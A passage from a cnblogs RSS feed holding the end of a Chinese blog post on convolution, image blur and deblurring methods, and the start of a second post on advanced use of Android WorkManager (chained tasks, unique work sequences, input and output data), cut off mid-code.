&lt;p&gt;这样看，虽然知道是在做一个点面计算的操作，但是要具体描述卷积的用途或者原理，是有点困难的。&lt;/p&gt;
&lt;p&gt;在两年前一次公司的内部技术分享会上，我是这么定义卷积的。&lt;/p&gt;
&lt;p&gt;卷积计算从形象上来描述，在图像领域，一般是2维，&lt;/p&gt;
&lt;p&gt;所以可以这么说 “计算两个物体在n维空间的相似度(叠加度)的操作，就称之为(n维)卷积。”&lt;/p&gt;
&lt;p&gt;所以图像是计算两个物体在2维空间的相似度(叠加度)的操作，就称之为卷积。&lt;/p&gt;
&lt;p&gt;如果两个物体完全一致，卷积完全重合，重合度为1，这时可以认为它就是同一个物体。&lt;/p&gt;
&lt;p&gt;以上描述的两个物体，在算法中一般 指的是 卷积核 和被卷积图片，卷积结果就是其两者的重合度。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/824862/201810/824862-20181001171738554-1473036759.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;看下深度学习中的池化层和均值层。&lt;/p&gt;
&lt;p&gt;根据上面的描述，重新理解一下，这两个层的作用。&lt;/p&gt;
&lt;p&gt;这里就不展开细讲了，大概大家能理解一下卷积这个操作即可。&lt;/p&gt;
&lt;p&gt;而一般情况下，卷积操作，是一种信息外散或内聚的计算，&lt;/p&gt;
&lt;p&gt;当然也有卷积，反卷积，转置卷积的说法。&lt;/p&gt;
&lt;p&gt;举个例子，例如均值池化或者说均值卷积，均值模糊。&lt;/p&gt;
&lt;p&gt;从计算来看，是取目标像素临近区域像素的平均值，而所有临近像素的权重都为1.&lt;/p&gt;
&lt;p&gt;最终目标像素的值为n分之1. &lt;/p&gt;
&lt;p&gt;那么这个计算就好像是把一个物品在2维空间直接摊平，还不能理解的再看下上面对卷积的描述。&lt;/p&gt;
&lt;p&gt;就像你有9只蚂蚁，你希望他们长得一样大，你一巴掌下去，身体全部压平。&lt;/p&gt;
&lt;p&gt;而在图像领域，绝大多数的模糊，就是受到一个“物体”或者说“卷积核”的干扰，&lt;/p&gt;
&lt;p&gt;致使采集到的信息丢失，或者说不准确。&lt;/p&gt;
&lt;p&gt;例如在按下快门的一瞬间，你手抖了，或者说失去焦点，&lt;/p&gt;
&lt;p&gt;就会很容易造成呈像模糊。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.图像修复&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假设我们能找到导致成像模糊的原因，是不是就能实现修复模糊图像呢？&lt;/p&gt;
&lt;p&gt;答案是肯定的。&lt;/p&gt;
&lt;p&gt;不过取决于最终采集到的信息的完整度。&lt;/p&gt;
&lt;p&gt;如果最后成像一片漆黑，那这个时候是无能为力的。&lt;/p&gt;
&lt;p&gt;因为已经没有足够的信息了。&lt;/p&gt;
&lt;p&gt;而一般图像是由色光三原色组成，红绿蓝。&lt;/p&gt;
&lt;p&gt;理论上只要其中一种颜色信息完整，就可以用于辅助修复其他色光。&lt;/p&gt;
&lt;p&gt;只要能计算到当时的色光分布情况即可实现。&lt;/p&gt;
&lt;p&gt;这里我们就需要稍微提及一下摄像领域3大算法，自动白平衡，自动对焦，自动曝光。&lt;/p&gt;
&lt;p&gt;简单讲下 这三个算法的区别。&lt;/p&gt;
&lt;p&gt;白平衡是为了解决色光分布不均，信息缺失或失真问题的。&lt;/p&gt;
&lt;p&gt;自动对焦是为了成像清晰，人为干扰辅助最终成像。&lt;/p&gt;
&lt;p&gt;自动曝光当然是为了解决采光问题，弥补感光元件的不足。&lt;/p&gt;
&lt;p&gt;大概的先后顺序，理论上应该是 对焦-&amp;gt;曝光-&amp;gt;白平衡&lt;/p&gt;
&lt;p&gt;一般而言，从这逻辑来看，白平衡是最难解决的，因为它受到前面两个因素的干扰。&lt;/p&gt;
&lt;p&gt;但是实际上，白平衡和曝光目前都解决得很好。&lt;/p&gt;
&lt;p&gt;HDR严格意义上来说，能兼顾白平衡和曝光。&lt;/p&gt;
&lt;p&gt;但是对焦或者说失焦，抖动的问题，一直以来都是老大难。&lt;/p&gt;
&lt;p&gt;原因也很简单，导致成像模糊的因素有很多，通过什么样的方法来有效评估修复，就显得比较困难。&lt;/p&gt;
&lt;p&gt; 假设能知道计算到当时受到什么“物体”的干扰，通过卷积的方式，移除这干扰，是不是就能修复模糊，恢复图片呈像。&lt;/p&gt;
&lt;p&gt;假设造成模糊的因素为：   清晰的图片 + 干扰因素 = 最终成像&lt;/p&gt;
&lt;p&gt;那么反之恢复图像即为：   最终成像 - 干扰因素 = 清晰图片&lt;/p&gt;
&lt;p&gt;而这里把干扰因素和清晰的图片都认为是一种卷积“物体”。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.去模糊&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有了前面的基础知识，我们可以做一个假设，进行验证。&lt;/p&gt;
&lt;p&gt;例如，我先对一张图片做卷积操作，模拟模糊成像。&lt;/p&gt;
&lt;p&gt;这个时候： 你同时有了  清晰的图片 + 干扰因素 = 最终成像&lt;/p&gt;
&lt;p&gt;验证一下：  最终成像 - 干扰因素 = 清晰图片&lt;/p&gt;
&lt;p&gt;这里不展开算法实现，&lt;/p&gt;
&lt;p&gt;但是结果我可以告诉大家，这思路没错，但是有一个干扰因素错了。&lt;/p&gt;
&lt;p&gt;它就是卷积核的大小。&lt;/p&gt;
&lt;p&gt;卷积核大小直接决定它的作用范围。&lt;/p&gt;
&lt;p&gt;而我们第一步拿到的 清晰的图片 + 干扰因素 = 最终成像&lt;/p&gt;
&lt;p&gt;这里 最终成像-干扰因素 却绝对不等于清晰的图片。&lt;/p&gt;
&lt;p&gt;因为 这里的干扰因素和最终成像 两者之间并不是简单的线性关系，相加或者相减，&lt;/p&gt;
&lt;p&gt;他们的关系是卷积关系，也就是说他们都受到卷积核的影响。&lt;/p&gt;
&lt;p&gt;如果想要达到 最终成像 - 干扰因素 = 清晰图片&lt;/p&gt;
&lt;p&gt;必须 在最终成像的时候用类似卷积的方式，消除卷积核的内容以及范围的影响。&lt;/p&gt;
&lt;p&gt;换句话说，这个操作必须控制好变量。&lt;/p&gt;
&lt;p&gt;这个问题说真的，我思考了很久很久。&lt;/p&gt;
&lt;p&gt;最后终于知道问题在哪里，就是图像的明度，也就是最终成像。&lt;/p&gt;
&lt;p&gt;也就是最终成像中是含有卷积核权重信息的，如果要消除这个信息，&lt;/p&gt;
&lt;p&gt;必须将成像也作为权重参与计算。&lt;/p&gt;
&lt;p&gt; 也就是说，造成模糊的情况应该是：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:cpp;gutter:true;&quot;&gt;
    if( sqrt(nx-x) + sqrt(ny-y) &amp;lt;  sqrt(radius) )
    {
        w = luminance(rgb)
        sum += w*s;
        wsum += w;
    }
     sum /= wsum; 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　伪代码，简洁形象地表达这个现象。&lt;/p&gt;
&lt;p&gt;知道这个前因后果，现在恢复模糊，该如何计算。&lt;/p&gt;
&lt;p&gt;这个留个作业给大家。&lt;/p&gt;
&lt;p&gt;上面伪代码我称之为  散焦 算法，反之为 聚焦 也就是去模糊 。&lt;/p&gt;
&lt;p&gt;聚焦算法最终可以实现耗时模糊半径无关，它是去模糊的一种特例。&lt;/p&gt;
&lt;p&gt;目前，此算法暂无开源计划。&lt;/p&gt;
&lt;p&gt;好几年前就有去模糊的商业软件，当然早期版本作者也开源了。&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/Y-Vladimir/SmartDeblur&quot; target=&quot;_blank&quot;&gt;https://github.com/Y-Vladimir/SmartDeblur&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;但是这个项目并没有很好准确计算到去模糊卷积核。&lt;/p&gt;
&lt;p&gt;前几天ipol.im公布了一个比较优秀的评估去模糊卷积核的算法。&lt;/p&gt;
&lt;p&gt;&lt;a class=&quot;title&quot; href=&quot;https://www.ipol.im/pub/art/2018/211/&quot;&gt;Estimating an Image's Blur Kernel Using Natural Image Statistics, and Deblurring it: An Analysis of the Goldstein-Fattal Method&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;从官网demo演示来看，效果特别不错。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/824862/201810/824862-20181001184937873-847746698.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/824862/201810/824862-20181001184946621-450152055.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但是，它和SmartDeblur 都有着一样的问题，就是用到傅里叶变换去做卷积操作，&lt;/p&gt;
&lt;p&gt;十分耗时。&lt;/p&gt;
&lt;p&gt;都采用了fftw，计算量还是居高不下。&lt;/p&gt;
&lt;p&gt;我对它提供的代码，做了一些简单的裁剪，cmake编译通过，仅依赖fftw。&lt;/p&gt;
&lt;p&gt;而代码的算法调优等等，还没做，算法优化空间比较大，最近精力有限，&lt;/p&gt;
&lt;p&gt;在音频算法上花的时间比较多，图像暂时没有精力做起来。&lt;/p&gt;
&lt;p&gt;感兴趣的朋友，可以移步项目：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/cpuimage/Deblurring&quot; target=&quot;_blank&quot;&gt;https://github.com/cpuimage/Deblurring&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而近些年，深度学习大兴，各种各样的模型以及训练集，五花八门。&lt;/p&gt;
&lt;p&gt;当然也有去模糊的实现。&lt;/p&gt;
&lt;p&gt;效果非常惊艳！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/824862/201810/824862-20181001182131713-1546196544.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;网络结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/824862/201810/824862-20181001182043000-204898932.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;对于采用深度学习的方法进行去模糊实现，可以参阅文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.sicara.com/keras-generative-adversarial-networks-image-deblurring-45e3ab6977b5&quot; target=&quot;_blank&quot;&gt;https://blog.sicara.com/keras-generative-adversarial-networks-image-deblurring-45e3ab6977b5&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;项目地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/RaphaelMeudec/deblur-gan&quot; target=&quot;_blank&quot;&gt;https://github.com/RaphaelMeudec/deblur-gan&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;相关论文：&lt;/p&gt;
&lt;p&gt;DeblurGAN: Blind Motion Deblurring Using Conditional Adversarial Networks&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://arxiv.org/pdf/1711.07064.pdf&quot; target=&quot;_blank&quot;&gt;https://arxiv.org/pdf/1711.07064.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;最后做一个简单的总结，在图像领域，使用卷积就能非常好解决 图像的空间问题，&lt;/p&gt;
&lt;p&gt;而深度学习训练得到的权重，可以简单的类比上面提到的干扰因素。&lt;/p&gt;
&lt;p&gt;通过大量的数据，训练提取 可能性的干扰因素（物体），若是当前图像也有符合这个特征的因素（物体），&lt;/p&gt;
&lt;p&gt;则进行相应的操作计算。&lt;/p&gt;
&lt;p&gt;定位特征，确认特征，发现并处理特征。&lt;/p&gt;
&lt;p&gt;分别 对应物体检测，物体识别，风格化或其他增强修复处理。&lt;/p&gt;
&lt;p&gt;采用深度学习最大的好处就是能预先训练得到已知的信息，然后进行对应的处理。&lt;/p&gt;
&lt;p&gt;而传统算法，则需要采用先验条件，&lt;/p&gt;
&lt;p&gt;然后在一张图片中去发现可能性因素，由于参数较少，鲁棒性一般不佳。&lt;/p&gt;
&lt;p&gt;相比而言，传统算法困难重重，因为你要通过科学方式找到一种适配数据自然规律的先验，真的太不容易。&lt;/p&gt;
&lt;p&gt;而深度学习是另一个问题，数据依赖，数据干扰，数据处理，这些预处理也着实够人头大的了，&lt;/p&gt;
&lt;p&gt;然后还要设计一个比较有效且优良的神经网络。&lt;/p&gt;
&lt;p&gt;就目前来看，经典传统算法稳定性比较高，但是泛化能力一般较差。&lt;/p&gt;
&lt;p&gt;深度学习目前还需要不少传统算法配合进行训练处理，以求达到更好的效果。&lt;/p&gt;
&lt;p&gt;就目前来看，工业化落地也有不少问题，不过相信很快就能做得很好了。&lt;/p&gt;
&lt;p&gt;因为有大公司和大量资金资本的助推，应该不是难事。&lt;/p&gt;

&lt;p&gt;若有其他相关问题或者需求也可以邮件联系俺探讨。&lt;/p&gt;
&lt;p&gt;邮箱地址是: &lt;br/&gt;gaozhihan@vip.qq.com&lt;/p&gt;
</description>
<pubDate>Mon, 01 Oct 2018 11:40:00 +0000</pubDate>
<dc:creator>cpuimage</dc:creator>
<og:description>关于图像模糊算法的实现， 我相信大多数学习图像算法的朋友都很熟悉。 例如常见的毛玻璃效果，高斯模糊等等。 而图像模糊最简单的实现就是 在一定区域 对像素做平均值计算。 术语描述，卷积。 1.认识卷积</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/cpuimage/p/9735150.html</dc:identifier>
</item>
<item>
<title>如何使用WorkManager执行后台任务(下) - hylinux1024</title>
<link>http://www.cnblogs.com/angrycode/p/9735229.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/angrycode/p/9735229.html</guid>
<description>&lt;h4 id=&quot;0x00workmanager&quot;&gt;0x00 WorkManager的高级用法&lt;/h4&gt;
&lt;p&gt;在上一文中已经了解到 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkManager&lt;/span&gt;&lt;/code&gt;的基本用法之后，今天来看看它的一些高级用法：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;链式任务调用&lt;/li&gt;
&lt;li&gt;唯一任务序列&lt;/li&gt;
&lt;li&gt;传递参数和获取返回值&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;0x01chainedtasks&quot;&gt;0x01 链式任务(Chained tasks)&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkManager&lt;/span&gt;&lt;/code&gt;在执行多个工作任务的时候，可以指定执行顺序。假设一个应用程序中有3个 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;OneTimeWorkRequest&lt;/span&gt;&lt;/code&gt;对象： &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workA&lt;/span&gt;&lt;/code&gt;、 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workB&lt;/span&gt;&lt;/code&gt;、 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workC&lt;/span&gt;&lt;/code&gt;。这几个任务需要按照顺序执行，那么可以使用 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkManager&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;beginWith&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;方法加入 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workA&lt;/span&gt;&lt;/code&gt;，这时候会返回一个 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkContinuation&lt;/span&gt;&lt;/code&gt;对象，它定义了工作任务的执行序列。然后通过它再调用 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkContinuation&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;kwd&quot;&gt;then&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;把 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workB&lt;/span&gt;&lt;/code&gt;和 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workC&lt;/span&gt;&lt;/code&gt;加入到执行队列中，最后执行 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkManager&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;enqueue&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;方法。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
WorkManager.getInstance()
    .beginWith(workA)
        // Note: WorkManager.beginWith() returns a
        // WorkContinuation object; the following calls are
        // to WorkContinuation methods
    .then(workB)    // FYI, then() returns a new WorkContinuation instance
    .then(workC)
    .enqueue()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkManager&lt;/span&gt;&lt;/code&gt;会按照指定的顺序来执行 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workA&lt;/span&gt;&lt;/code&gt;、 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workB&lt;/span&gt;&lt;/code&gt;、 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workC&lt;/span&gt;&lt;/code&gt;。如果其中有一个工作任务执行的时候返回 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Worker&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;typ&quot;&gt;Result&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;FAILURE&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;，那么整个执行序列就会停止。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkManager&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;beginWith&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;方法可以传递多个 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Worker&lt;/span&gt;&lt;/code&gt;对象，表示可以&lt;strong&gt;并行执行&lt;/strong&gt;的任务组，然后再调用 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;kwd&quot;&gt;then&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;方法。当这并行任务组都执行完之后才会执行接下来 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;kwd&quot;&gt;then&lt;/span&gt;&lt;/code&gt;中的工作任务。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;41&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
WorkManager.getInstance()
    // 首先，并行执行workA1,workA2,workA3这三个任务
    .beginWith(workA1, workA2, workA3)
    // 当三个任务都完成之后, 开始执行workB:
    .then(workB)
    // 最后再并行执行 workC1,workC2
    .then(workC1, workC2)
    .enqueue()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;还可以通过 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkContinuation&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;combine&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;方法创建更加复杂的链接任务调用序列。它可以将两个 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkContinuation&lt;/span&gt;&lt;/code&gt;对象合并，假设要调用如下的任务序列：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://md.barretlee.com/images/workcontinuation.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
val chain1 = WorkManager.getInstance()
    .beginWith(workA)
    .then(workB)
val chain2 = WorkManager.getInstance()
    .beginWith(workC)
    .then(workD)
val chain3 = WorkContinuation
    .combine(chain1, chain2)
    .then(workE)
chain3.enqueue()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这个链式执行顺序是：子链 A-&amp;gt;B 与子链 C-&amp;gt;D 并行执行的， &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workA&lt;/span&gt;&lt;/code&gt;执行后再执行 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workB&lt;/span&gt;&lt;/code&gt;，以及 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workC&lt;/span&gt;&lt;/code&gt;执行后执行 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workD&lt;/span&gt;&lt;/code&gt; ；然后等待 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workB&lt;/span&gt;&lt;/code&gt;以及 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workD&lt;/span&gt;&lt;/code&gt;都执行完，最后执行 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;workE&lt;/span&gt;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;需要注意的是， &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkManager&lt;/span&gt;&lt;/code&gt;无法保证两个子链的执行顺序，有可能 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;chain1&lt;/span&gt;&lt;/code&gt;比 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;chain2&lt;/span&gt;&lt;/code&gt;快，也有可能是 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;chain1&lt;/span&gt;&lt;/code&gt;比 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;chain2&lt;/span&gt;&lt;/code&gt;慢。&lt;/p&gt;
&lt;h4 id=&quot;0x02uniqueworksequences&quot;&gt;0x02 唯一任务序列(Unique work sequences)&lt;/h4&gt;
&lt;p&gt;在应用程序开发中，可能会多次把同一个链式任务添加到 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkManager&lt;/span&gt;&lt;/code&gt;中，但希望只有一个链式任务在执行，这时候可以使用唯一任务序列对链式任务指定处理规则。假设，做一个下载文件操作，对一个文件下载链接，我们不需要重复下载，只需要添加一次，后面再添加这个任务，就忽略掉，因为我们不希望重复多次下载同一个文件。所以当添加两个同样名称为&quot;download&quot;操作任务时，对于唯一任务序列来说，可以通过 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;ExistingWorkPolicy&lt;/span&gt;&lt;/code&gt;中的 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;REPLACE&lt;/span&gt;&lt;/code&gt;， &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;KEEP&lt;/span&gt;&lt;/code&gt; 和 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;APPEND&lt;/span&gt;&lt;/code&gt;，来指定添加的策略。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;REPLACE：新任务将替换旧的&lt;/li&gt;
&lt;li&gt;KEEP：新任务会被丢弃，旧的任务会被保持&lt;/li&gt;
&lt;li&gt;APPEND：追加，旧任务执行之后再执行新的任务。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;使用 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;pln&quot;&gt;beginUniqueWork&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;方法可以创建任务序列，并且可以指定唯一的一个名称(name)。然后再 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;ExistingWorkPolicy&lt;/span&gt;&lt;/code&gt;指定任务的替换策略&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
WorkContinuation continuation = mWorkManager
                .beginUniqueWork(&quot;download&quot;,
                       ExistingWorkPolicy.KEEP,
                       OneTimeWorkRequest.from(CleanupWorker))
&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&quot;0x03&quot;&gt;0x03 传递参数和获取返回值&lt;/h4&gt;
&lt;p&gt;任务执行可以传递参数以及获取到任务执行的结果。使用 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;WorkRequst&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;typ&quot;&gt;Builder&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;setInputData&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;方法传递一个 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Data&lt;/span&gt;&lt;/code&gt;对象，它是key-value形式的对象，使用 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Data&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;typ&quot;&gt;Builder&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;来创建。在 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Worker&lt;/span&gt;&lt;/code&gt;类中可以使用 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Worker&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;getInputData&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;获取到参数。&lt;/p&gt;
&lt;p&gt;同样地，在 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Worker&lt;/span&gt;&lt;/code&gt;中可以使用 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Worker&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;setOutputData&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;设置一个 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Data&lt;/span&gt;&lt;/code&gt;对象的返回值。要获取到这个返回值就通过 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;LiveData&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;span class=&quot;typ&quot;&gt;WorkStatus&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;举个栗子：&lt;/p&gt;
&lt;p&gt;有一个下载任务，在 &lt;code class=&quot;prettyprint code-in-text prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Worker&lt;/span&gt;&lt;/code&gt;中获取传递过来的参数url，然后执行下载，最后设置下载结果。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;37&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
// the result key:
const val KEY_RESULT = &quot;result&quot;
